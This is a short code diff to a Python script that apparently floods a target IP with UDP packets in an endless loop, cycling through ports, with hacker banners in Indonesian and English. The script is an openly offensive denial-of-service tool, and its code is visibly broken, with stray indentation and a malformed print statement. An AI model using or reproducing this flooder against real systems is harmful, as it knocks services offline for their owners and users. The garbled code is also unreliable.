@@ -28,16 +28,12 @@ def run():
 
 os.system("clear")
 os.system("figlet Attack Starting")
-addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
 print("ArthurXzz MengHack Situs Mars")
-except:
-			print("[!] NUKLIR TERKIRIM OLEH ARTHUR!!!")
+
 time.sleep(3)
 sent = 99999
 while True:
-     sock.send(bytes, (ip,port)) 
+     s.sendto(bytes, (ip,port)) 
      sent = sent + 1
      port = port + 1
      print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
